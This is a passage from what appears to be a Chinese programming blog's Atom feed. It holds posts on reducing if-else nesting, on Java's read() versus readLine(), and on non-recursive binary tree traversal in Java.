    <id>https://www.fvolcano.red/2020/ultimazation-of-ifelse/</id>
    <published>2020-11-05T12:27:43.000Z</published>
    <updated>2020-11-05T12:27:43.000Z</updated>
    
    <content type="html"><![CDATA[<p>针对 if-else 的各种不同优化方案。<a id="more"></a></p><h1 id="消灭if-else嵌套"><a href="#消灭if-else嵌套" class="headerlink" title="消灭if-else嵌套"></a>消灭if-else嵌套</h1><p><a href="https://juejin.im/post/6844904080104488967">参考出处1</a>：使用设计模式中的<strong>策略模式</strong>来优化针对不同条件进行不同操作的需求。</p><p><a href="https://blog.csdn.net/fzy629442466/article/details/85762748">参考出处2</a>：优化大量的if else 的不同方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                        ...</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>if-else</code>一般不建议嵌套超过三层，如果一段代码存在过多的<code>if-else</code>嵌套，代码的可读性就会急速下降，后期维护难度也大大提高。</p><h1 id="多条件判断时的if-else选择与排序"><a href="#多条件判断时的if-else选择与排序" class="headerlink" title="多条件判断时的if-else选择与排序"></a>多条件判断时的if-else选择与排序</h1><p><a href="https://www.cnblogs.com/rwg-xs/articles/6213168.html">参考出处</a></p><h2 id="原则"><a href="#原则" class="headerlink" title="原则"></a>原则</h2><h3 id="if-else-语句块的顺序"><a href="#if-else-语句块的顺序" class="headerlink" title="if/else 语句块的顺序"></a>if/else 语句块的顺序</h3><ul><li>首先处理正逻辑而不是负逻辑</li><li>先处理简单的情况</li><li>先处理有趣的或者是可疑的情况</li></ul><h3 id="通过提早返回减少嵌套"><a href="#通过提早返回减少嵌套" class="headerlink" title="通过提早返回减少嵌套"></a>通过提早返回减少嵌套</h3><h3 id="总结变量"><a href="#总结变量" class="headerlink" title="总结变量"></a>总结变量</h3><ul><li>用一个短很多的名字来代替一大块代码，这就是总结变量。</li><li>使用德摩根定理,分解复制的判断逻辑</li><li>拆分巨大的语句，让语句更容易快速阅读</li></ul><h3 id="分析函数（或代码块）画出逻辑树"><a href="#分析函数（或代码块）画出逻辑树" class="headerlink" title="分析函数（或代码块）画出逻辑树"></a>分析函数（或代码块）画出逻辑树</h3><p>逻辑树是为了理清复杂if语句逻辑二产生的，结构与哈夫曼树类似：</p><p><img src="/2020/ultimazation-of-ifelse/1013328-20161222224548995-776032877.png"> </p><p>逻辑树规则：（模块的定义：每一个if/else的分支即为一个模块）</p><p>1.每个模块都是一个根结点，每一个根结点都会结束函数运行。</p><p>2.同等级的模块（即if语句的正反两面），无子模块的模块（内部无if语句）优先级高于拥有子模块的模块（内部嵌套if语句）</p><p>3.同等级和同条件（两个模块都拥有子模块或者都没有子模块）的情况下，使用率高的模块优先级高于使用率低的</p><p>4.若模块中包含子模块，子模块的优先级高于父模块。</p><p><strong>例：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="keyword">if</span>(user_result == SUCCESS )&#123;</span><br><span class="line">    <span class="comment">// 2</span></span><br><span class="line">　　<span class="keyword">if</span>( permission_result != SUCCESS)&#123;</span><br><span class="line">      <span class="comment">// 3</span></span><br><span class="line">　　　　reply.WriteErrors(<span class="string">&quot;error reading permissions&quot;</span>);</span><br><span class="line">　　　　reply.Done();</span><br><span class="line">　　　　<span class="keyword">return</span>;</span><br><span class="line">   <span class="comment">// 2   </span></span><br><span class="line">　　&#125;</span><br><span class="line">　　reply.WriteErrors(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="comment">// 1    </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// 4</span></span><br><span class="line">　　reply.WriteErrors(user_result);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 共有</span></span><br><span class="line">reply.Done();</span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><p>根据原则优化：</p><ol><li><p>2、4两个属于同等级模块，但是由于红色模块中包含一个子模块，所以红色模块优先级低于紫色模块</p></li><li><p>3模块属于2模块子模块，所以3模块优先级高于2模块</p></li><li><p>函数的优先级排列由高到低为：4  &gt; 3 &gt; 2</p></li></ol><p>得：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(user_result != SUCCESS)&#123;</span><br><span class="line">　　reply.WriteErrors(user_result);</span><br><span class="line">　　reply.Done();</span><br><span class="line">　　<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(permission_result != SUCCESS)&#123;</span><br><span class="line">　　reply.WriteErrors(permission_result);</span><br><span class="line">　　reply.Done();</span><br><span class="line">　　<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">reply.WriteErrors(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">reply.Done();</span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><h1 id="哈夫曼树在多重判定程序中的运用"><a href="#哈夫曼树在多重判定程序中的运用" class="headerlink" title="哈夫曼树在多重判定程序中的运用"></a>哈夫曼树在多重判定程序中的运用</h1><p><a href="https://www.docin.com/p-764063178.html">参考论文</a></p><p><img src="/2020/ultimazation-of-ifelse/%E5%93%88%E5%A4%AB%E6%9B%BC.png" alt="哈夫曼"></p><h1 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h1><h2 id="多个「或」等值判断"><a href="#多个「或」等值判断" class="headerlink" title="多个「或」等值判断"></a>多个「或」等值判断</h2><p><a href="https://www.toutiao.com/i6535677221640602125/">参考出处</a></p><p>reg.equals(“1”) || reg.equals(“2”) || reg.equals(“3”)||…省去n个</p><p>可以借助map或set来进行判断，因为hashmap是一个hash桶，查找的效率是比较快的，不管判断任何值，查询效率基本很稳定。</p><p>推荐指定hashmap的长度和需要判断的元素一样多，这样就避免对某一个桶内衍生出多余链表了。</p><p><img src="/2020/ultimazation-of-ifelse/1521705513450288676a8a8" alt="Java逻辑条件多个「或」判断时，性能优化小技巧，值得一试"></p><p><img src="/2020/ultimazation-of-ifelse/15217055457025d21af6336" alt="Java逻辑条件多个「或」判断时，性能优化小技巧，值得一试"></p><h2 id="提前判断返回"><a href="#提前判断返回" class="headerlink" title="提前判断返回"></a>提前判断返回</h2><p>如下语句</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(condition)&#123;</span><br><span class="line">   <span class="comment">//dost</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">12345</span></span><br></pre></td></tr></table></figure><p>改为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!condition)&#123;</span><br><span class="line">   <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//dost</span></span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure><p>避免一些不必要的分支，让代码更精炼。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;针对 if-else 的各种不同优化方案。&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>FileInputStream read()与readline()</title>
    <link href="https://www.fvolcano.red/2020/FileInputStream-read-and-readline/"/>
    <id>https://www.fvolcano.red/2020/FileInputStream-read-and-readline/</id>
    <published>2020-10-24T06:16:10.000Z</published>
    <updated>2020-10-24T06:16:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>FileInputStream中方法read()与readline()辨析。<a id="more"></a></p><h3 id="read-与-read-byte-b"><a href="#read-与-read-byte-b" class="headerlink" title="read() 与 read(byte[] b)"></a>read() 与 read(byte[] b)</h3><p>读取单个字符的个数，如果已经读完的话会返回-1 (其范围从 0 到 65535 )，这个方法是对这个流一个一个字节的读，返回的int就是这个字节的int表示方式。</p><p>参考<a href="https://blog.csdn.net/wymrdjm/article/details/78758986">FileInputStream之read方法</a></p><h2 id="readLine"><a href="#readLine" class="headerlink" title="readLine()"></a>readLine()</h2><p>读取一个文本行。</p><ol><li>读入的数据要注意有/r或/n或/r/n, readLine返回的字符串中不包含结尾的”\r”,”\n”。</li><li>没有数据时会阻塞，在数据流异常或断开时才会返回null。</li><li>使用socket之类的数据流时，要避免使用readLine()，以免为了等待一个换行/回车符而一直阻塞。</li><li>readLine()是一个阻塞函数，当没有数据读取时，就一直会阻塞在那，而不是返回null。</li><li>readLine()只有在数据流发生异常或者另一端被close()掉时，才会返回null值。</li><li>如果不指定buffer大小，则readLine()使用的buffer有8192个字符。在达到buffer大小之前，只有遇到”/r”、”/n”、”/r/n”才会返回。</li><li>该方法读取一行文本，当遇到换行符”\n”,回车符”\r”或者回车符后面紧跟着换行符时，该行结束并返回。没有数据时，将会一直处于等待状态。因此在进行网络连接时，应该避免使用该方法。</li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;FileInputStream中方法read()与readline()辨析。&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="https://www.fvolcano.red/categories/Java/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>树的遍历非递归算法及应用</title>
    <link href="https://www.fvolcano.red/2020/tree-traverse/"/>
    <id>https://www.fvolcano.red/2020/tree-traverse/</id>
    <published>2020-10-16T00:40:24.000Z</published>
    <updated>2020-10-16T00:40:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>介绍树的三种非递归遍历代码的Java实现及应用。<a id="more"></a></p><h1 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h1><p>创建内部接口 Visitor ，通过传入方法来实现对遍历元素的定制操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Visitor</span>&lt;<span class="title">E</span>&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> stop = <span class="keyword">false</span>; <span class="comment">// 标记停止位置，设置为true代表停止遍历</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">visit</span><span class="params">(TreeNode&lt;E&gt; node)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Visitor visitor = (node) -&gt; &#123;  <span class="comment">// 默认visitor，若没有传入则使用</span></span><br><span class="line">    System.out.print(node.element + <span class="string">&quot; &quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BinaryTree&lt;Integer&gt; tree = <span class="keyword">new</span> BinaryTree&lt;&gt;();</span><br><span class="line">tree.preorder((node) -&gt; &#123;  </span><br><span class="line">    <span class="keyword">if</span>(node.element == <span class="number">2</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    node.element ++;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="先序遍历"><a href="#先序遍历" class="headerlink" title="先序遍历"></a>先序遍历</h2><p>递归：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">preorder1</span><span class="params">(Visitor visitor)</span></span>&#123;  <span class="comment">//设置为private，在public方法中有对visitor为空的判断</span></span><br><span class="line">    <span class="keyword">if</span>(root==<span class="keyword">null</span> || visitor.stop) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    visitor.visit(root); <span class="comment">// 先对父节点进行操作</span></span><br><span class="line">    preorder1(root.left,visitor);</span><br><span class="line">    preorder1(root.right,visitor);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>非递归：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">preorder2</span><span class="params">(Visitor visitor)</span> </span>&#123;</span><br><span class="line">    TreeNode&lt;E&gt; node = root;</span><br><span class="line">    Stack&lt;TreeNode&lt;E&gt;&gt; stack = <span class="keyword">new</span> LinkedStack&lt;TreeNode&lt;E&gt;&gt;();</span><br><span class="line">    List&lt;TreeNode&lt;E&gt;&gt; visited = <span class="keyword">new</span> LinkedList&lt;TreeNode&lt;E&gt;&gt;(); <span class="comment">//记录访问过的节点</span></span><br><span class="line">    <span class="keyword">if</span>(visitor.stop) <span class="keyword">return</span>;</span><br><span class="line">    visitor.visit(node);</span><br><span class="line">    visited.add(node);</span><br><span class="line">    stack.push(node);</span><br><span class="line">    <span class="keyword">while</span>(visited.size() &lt; size) &#123;  <span class="comment">//size是tree的节点个数</span></span><br><span class="line">        <span class="keyword">if</span>(visitor.stop) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">// 来到这里，node已经被访问了，有left就立即访问，放入栈中，成为下一次访问的父节点（返回处）</span></span><br><span class="line">        <span class="keyword">if</span>(node.left != <span class="keyword">null</span> &amp;&amp; !visited.contains(node.left)) &#123;</span><br><span class="line">            visitor.visit(node.left);</span><br><span class="line">            visited.add(node.left);</span><br><span class="line">            stack.push(node.left);</span><br><span class="line">            node = node.left;</span><br><span class="line">        &#125; <span class="keyword">else</span> </span><br><span class="line">            <span class="comment">// 有right就立即访问，放入栈中，成为下一次访问的父节点（返回处）</span></span><br><span class="line">            <span class="keyword">if</span> (node.right != <span class="keyword">null</span> &amp;&amp; !visited.contains(node.right)) &#123;</span><br><span class="line">            visitor.visit(node.right);</span><br><span class="line">            visited.add(node.right);</span><br><span class="line">            stack.push(node.right);</span><br><span class="line">            node = node.right;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// 左右节点都没有了就弹栈，查看父节点的右节点</span></span><br><span class="line">            node = stack.pop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h2><p>递归：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">inorder1</span><span class="params">(Visitor visitor)</span></span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(root==<span class="keyword">null</span> || visitor.stop) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    inorder1(root.left,visitor);</span><br><span class="line">    <span class="keyword">if</span>(visitor.stop) <span class="keyword">return</span>;</span><br><span class="line">    visitor.visit(root);</span><br><span class="line">    inorder1(root.right,visitor);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>非递归：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">inorder2</span><span class="params">(Visitor visitor)</span></span>&#123;</span><br><span class="line">    TreeNode&lt;E&gt; node = root;</span><br><span class="line">    List&lt;TreeNode&lt;E&gt;&gt; visited = <span class="keyword">new</span> LinkedList&lt;TreeNode&lt;E&gt;&gt;();</span><br><span class="line">    Stack&lt;TreeNode&lt;E&gt;&gt; stack = <span class="keyword">new</span> LinkedStack&lt;TreeNode&lt;E&gt;&gt;();</span><br><span class="line">    stack.push(node);</span><br><span class="line">    <span class="keyword">while</span>(node.left != <span class="keyword">null</span>) &#123; <span class="comment">//一直找到最左节点</span></span><br><span class="line">        stack.push(node.left);</span><br><span class="line">        node = node.left;</span><br><span class="line">    &#125;</span><br><span class="line">    node = stack.pop();</span><br><span class="line">    <span class="keyword">while</span>(visited.size() &lt; size) &#123;</span><br><span class="line">        <span class="keyword">if</span>(node.left != <span class="keyword">null</span> &amp;&amp; !visited.contains(node.left)) &#123;</span><br><span class="line">            stack.push(node); <span class="comment">//有左节点才需要把该节点位置保存，否则直接访问</span></span><br><span class="line">            node = node.left;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(visitor.stop) <span class="keyword">return</span>;</span><br><span class="line">            visitor.visit(node);</span><br><span class="line">            visited.add(node);  <span class="comment">//先访问父节点，后判断是否有右节点</span></span><br><span class="line">            <span class="keyword">if</span>(node.right != <span class="keyword">null</span> &amp;&amp; !visited.contains(node.right)) &#123;</span><br><span class="line">                node = node.right;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                node = stack.pop();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="后序遍历"><a href="#后序遍历" class="headerlink" title="后序遍历"></a>后序遍历</h2><p>递归：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">postorder1</span><span class="params">(Visitor visitor)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="keyword">null</span> || visitor.stop) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    postorder1(root.left,visitor);</span><br><span class="line">    postorder1(root.right,visitor);</span><br><span class="line">    <span class="keyword">if</span>(visitor.stop) <span class="keyword">return</span>;</span><br><span class="line">    visitor.visit(root);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>非递归：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">postorder2</span><span class="params">(TreeNode&lt;E&gt; root,Visitor visitor)</span></span>&#123;</span><br><span class="line">    TreeNode&lt;E&gt; node = root;</span><br><span class="line">    List&lt;TreeNode&lt;E&gt;&gt; visited = <span class="keyword">new</span> LinkedList&lt;TreeNode&lt;E&gt;&gt;();</span><br><span class="line">    Stack&lt;TreeNode&lt;E&gt;&gt; stack = <span class="keyword">new</span> LinkedStack&lt;TreeNode&lt;E&gt;&gt;();</span><br><span class="line">    stack.push(node);</span><br><span class="line">    <span class="keyword">while</span>(node.left != <span class="keyword">null</span>) &#123;</span><br><span class="line">        stack.push(node.left);</span><br><span class="line">        node = node.left;</span><br><span class="line">    &#125;</span><br><span class="line">    node = stack.pop();</span><br><span class="line">    <span class="keyword">while</span>(visited.size() &lt; size) &#123;</span><br><span class="line">        <span class="keyword">if</span>((node.left != <span class="keyword">null</span> &amp;&amp; !visited.contains(node.left)) ||</span><br><span class="line">           (node.right != <span class="keyword">null</span> &amp;&amp; !visited.contains(node.right))) &#123;  <span class="comment">//只有有需要访问的子节点</span></span><br><span class="line">            stack.push(node);  <span class="comment">//要访问子节点了，先把这个节点保存起来</span></span><br><span class="line">            <span class="keyword">if</span>(node.left != <span class="keyword">null</span> &amp;&amp; !visited.contains(node.left)) &#123;</span><br><span class="line">                node = node.left;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                node = node.right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(visitor.stop) <span class="keyword">return</span>;</span><br><span class="line">            visitor.visit(node);</span><br><span class="line">            visited.add(node); <span class="comment">//当左右节点访问完了，再访问父节点</span></span><br><span class="line">            node = stack.pop(); <span class="comment">//访问完这棵子树，弹栈</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="层序遍历"><a href="#层序遍历" class="headerlink" title="层序遍历"></a>层序遍历</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">levelorder</span><span class="params">(Visitor visitor)</span></span>&#123;</span><br><span class="line">    Queue&lt;TreeNode&lt;E&gt;&gt; queue = <span class="keyword">new</span> LinkedQueue&lt;TreeNode&lt;E&gt;&gt;();</span><br><span class="line">    queue.offer(root);</span><br><span class="line">    <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">        TreeNode&lt;E&gt; node = queue.poll();</span><br><span class="line">        <span class="keyword">if</span>(visitor.stop) <span class="keyword">break</span>;</span><br><span class="line">        visitor.visit(node);</span><br><span class="line">        <span class="keyword">if</span>(node.left!=<span class="keyword">null</span>) queue.offer(node.left);</span><br><span class="line">        <span class="keyword">if</span>(node.right!=<span class="keyword">null</span>) queue.offer(node.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h1><h2 id="计算树的高度"><a href="#计算树的高度" class="headerlink" title="计算树的高度"></a>计算树的高度</h2><h2 id="计算树的节点数量"><a href="#计算树的节点数量" class="headerlink" title="计算树的节点数量"></a>计算树的节点数量</h2><h2 id="复制树"><a href="#复制树" class="headerlink" title="复制树"></a>复制树</h2><p>非递归：(先序遍历)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> BinaryTree&lt;E&gt; <span class="title">copy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    TreeNode&lt;E&gt; newRoot = <span class="keyword">new</span> TreeNode&lt;&gt;(root.element);</span><br><span class="line">    TreeNode&lt;E&gt; p = newRoot;</span><br><span class="line">    TreeNode&lt;E&gt; node = root;</span><br><span class="line">    List&lt;TreeNode&lt;E&gt;&gt; visited = <span class="keyword">new</span> LinkedList&lt;TreeNode&lt;E&gt;&gt;();</span><br><span class="line">    Stack&lt;TreeNode&lt;E&gt;&gt; stack = <span class="keyword">new</span> LinkedStack&lt;TreeNode&lt;E&gt;&gt;();</span><br><span class="line">    visited.add(newRoot);</span><br><span class="line">    <span class="keyword">while</span> (visited.size() != size) &#123;</span><br><span class="line">        <span class="keyword">if</span>(node.left != <span class="keyword">null</span> &amp;&amp; !visited.contains(node.left)) &#123;</span><br><span class="line">            stack.push(node);</span><br><span class="line">            TreeNode&lt;E&gt; newNode = <span class="keyword">new</span> TreeNode&lt;E&gt;(node.left.element);</span><br><span class="line">            visited.add(node.left);</span><br><span class="line">            p.left = newNode;</span><br><span class="line">            newNode.parent = p;</span><br><span class="line">            node = node.left;</span><br><span class="line">            p = p.left;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(node.right != <span class="keyword">null</span> &amp;&amp; !visited.contains(node.right)) &#123;</span><br><span class="line">            stack.push(node);  <span class="comment">// p只能按照parent的顺序返回，因此这里即使已经访问完这棵子树，仍需要将node压入栈中保存位置，否则node会与p不同步</span></span><br><span class="line">            TreeNode&lt;E&gt; newNode = <span class="keyword">new</span> TreeNode&lt;E&gt;(node.right.element);</span><br><span class="line">            visited.add(node.right);</span><br><span class="line">            p.right = newNode;</span><br><span class="line">            newNode.parent = p;</span><br><span class="line">            node = node.right;</span><br><span class="line">            p = p.right;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            node = stack.pop();</span><br><span class="line">            p = p.parent;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    BinaryTree&lt;E&gt; newTree = <span class="keyword">new</span> BinaryTree&lt;&gt;();</span><br><span class="line">    newTree.size = size;</span><br><span class="line">    newTree.root = newRoot;</span><br><span class="line">    <span class="keyword">return</span> newTree;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;介绍树的三种非递归遍历代码的Java实现及应用。&lt;/p&gt;</summary>
    
    
    
    <category term="算法" scheme="https://www.fvolcano.red/categories/%E7%AE%97%E6%B3%95/"/>
    
    
